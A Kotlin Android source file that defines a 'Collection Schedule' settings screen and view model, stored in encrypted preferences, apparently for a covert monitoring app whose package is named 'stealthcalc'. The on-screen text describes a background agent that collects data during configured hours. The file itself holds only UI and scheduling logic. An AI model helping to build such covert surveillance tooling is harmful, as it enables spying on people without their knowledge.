package com.stealthcalc.monitoring.ui

import android.content.SharedPreferences
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Switch
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.lifecycle.ViewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import com.stealthcalc.core.di.EncryptedPrefs
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import javax.inject.Inject

data class ScheduleState(
    val enabled: Boolean = false,
    val startHour: Int = 0,
    val endHour: Int = 24,
    val daysOfWeek: Set<Int> = setOf(1, 2, 3, 4, 5, 6, 7),
)

@HiltViewModel
class ScheduleConfigViewModel @Inject constructor(
    @EncryptedPrefs private val prefs: SharedPreferences,
) : ViewModel() {

    companion object {
        const val KEY_SCHEDULE_ENABLED = "schedule_enabled"
        const val KEY_SCHEDULE_START = "schedule_start_hour"
        const val KEY_SCHEDULE_END = "schedule_end_hour"
        const val KEY_SCHEDULE_DAYS = "schedule_days"
    }

    private val _state = MutableStateFlow(
        ScheduleState(
            enabled = prefs.getBoolean(KEY_SCHEDULE_ENABLED, false),
            startHour = prefs.getInt(KEY_SCHEDULE_START, 0),
            endHour = prefs.getInt(KEY_SCHEDULE_END, 24),
            daysOfWeek = prefs.getString(KEY_SCHEDULE_DAYS, "1,2,3,4,5,6,7")
                ?.split(",")?.mapNotNull { it.trim().toIntOrNull() }?.toSet()
                ?: setOf(1, 2, 3, 4, 5, 6, 7),
        )
    )
    val state: StateFlow<ScheduleState> = _state.asStateFlow()

    fun toggleEnabled() {
        val new = !_state.value.enabled
        prefs.edit().putBoolean(KEY_SCHEDULE_ENABLED, new).apply()
        _state.update { it.copy(enabled = new) }
    }

    fun setStartHour(hour: Int) {
        prefs.edit().putInt(KEY_SCHEDULE_START, hour).apply()
        _state.update { it.copy(startHour = hour) }
    }

    fun setEndHour(hour: Int) {
        prefs.edit().putInt(KEY_SCHEDULE_END, hour).apply()
        _state.update { it.copy(endHour = hour) }
    }

    fun toggleDay(day: Int) {
        val days = _state.value.daysOfWeek.toMutableSet()
        if (day in days) days.remove(day) else days.add(day)
        prefs.edit().putString(KEY_SCHEDULE_DAYS, days.joinToString(",")).apply()
        _state.update { it.copy(daysOfWeek = days) }
    }

    fun isWithinSchedule(): Boolean {
        val s = _state.value
        if (!s.enabled) return true
        val cal = java.util.Calendar.getInstance()
        val dayOfWeek = cal.get(java.util.Calendar.DAY_OF_WEEK)
        val hour = cal.get(java.util.Calendar.HOUR_OF_DAY)
        return dayOfWeek in s.daysOfWeek && hour in s.startHour until s.endHour
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ScheduleConfigScreen(
    onBack: () -> Unit,
    viewModel: ScheduleConfigViewModel = hiltViewModel(),
) {
    val state by viewModel.state.collectAsStateWithLifecycle()
    val dayNames = listOf("Sun" to 1, "Mon" to 2, "Tue" to 3, "Wed" to 4, "Thu" to 5, "Fri" to 6, "Sat" to 7)

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Collection Schedule") },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.background,
                    titleContentColor = MaterialTheme.colorScheme.onBackground,
                )
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier.fillMaxSize().padding(padding).padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp),
        ) {
            Row(
                modifier = Modifier.fillMaxWidth().clickable { viewModel.toggleEnabled() },
                verticalAlignment = Alignment.CenterVertically,
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("Schedule Collection", style = MaterialTheme.typography.bodyLarge)
                    Text(
                        if (state.enabled) "Only collect during configured hours" else "Collect 24/7 (no schedule)",
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onBackground.copy(alpha = 0.6f)
                    )
                }
                Switch(checked = state.enabled, onCheckedChange = { viewModel.toggleEnabled() })
            }

            if (state.enabled) {
                Text("Active Hours", style = MaterialTheme.typography.titleSmall)

                Row(horizontalArrangement = Arrangement.spacedBy(16.dp)) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("Start", style = MaterialTheme.typography.labelMedium)
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text("${state.startHour}:00", style = MaterialTheme.typography.titleMedium)
                            Column(modifier = Modifier.padding(start = 8.dp)) {
                                Text("+", modifier = Modifier.clickable {
                                    if (state.startHour < 23) viewModel.setStartHour(state.startHour + 1)
                                }, style = MaterialTheme.typography.titleMedium, color = MaterialTheme.colorScheme.primary)
                                Text("-", modifier = Modifier.clickable {
                                    if (state.startHour > 0) viewModel.setStartHour(state.startHour - 1)
                                }, style = MaterialTheme.typography.titleMedium, color = MaterialTheme.colorScheme.primary)
                            }
                        }
                    }
                    Column(modifier = Modifier.weight(1f)) {
                        Text("End", style = MaterialTheme.typography.labelMedium)
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text("${state.endHour}:00", style = MaterialTheme.typography.titleMedium)
                            Column(modifier = Modifier.padding(start = 8.dp)) {
                                Text("+", modifier = Modifier.clickable {
                                    if (state.endHour < 24) viewModel.setEndHour(state.endHour + 1)
                                }, style = MaterialTheme.typography.titleMedium, color = MaterialTheme.colorScheme.primary)
                                Text("-", modifier = Modifier.clickable {
                                    if (state.endHour > 1) viewModel.setEndHour(state.endHour - 1)
                                }, style = MaterialTheme.typography.titleMedium, color = MaterialTheme.colorScheme.primary)
                            }
                        }
                    }
                }

                Text("Active Days", style = MaterialTheme.typography.titleSmall)
                Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                    dayNames.forEach { (name, day) ->
                        val selected = day in state.daysOfWeek
                        Text(
                            name,
                            modifier = Modifier
                                .clickable { viewModel.toggleDay(day) }
                                .padding(8.dp),
                            style = MaterialTheme.typography.labelMedium,
                            color = if (selected) MaterialTheme.colorScheme.primary
                            else MaterialTheme.colorScheme.onBackground.copy(alpha = 0.3f)
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(16.dp))
            Text(
                "When scheduling is enabled, the agent only collects data during the configured hours and days. Outside the window, the service stays alive but skips collection cycles.",
                style = MaterialTheme.typography.bodySmall,
                color = MaterialTheme.colorScheme.onBackground.copy(alpha = 0.4f)
            )
        }
    }
}
